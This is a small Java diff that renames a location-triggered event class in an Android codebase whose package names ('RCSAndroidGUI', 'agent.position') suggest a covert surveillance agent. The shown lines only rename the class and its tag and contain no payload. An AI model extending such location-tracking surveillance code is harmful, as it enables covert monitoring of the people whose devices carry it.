@@ -12,9 +12,9 @@ import com.ht.RCSAndroidGUI.agent.position.GPSLocatorDistance;
 import com.ht.RCSAndroidGUI.agent.position.RangeObserver;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
-public class LocationEvent extends EventBase implements RangeObserver {
+public class EventLocation extends EventBase implements RangeObserver {
 
-	private static final String TAG = "LocationEvent";
+	private static final String TAG = "EventLocation";
 	int actionOnEnter;
 	int actionOnExit;
 
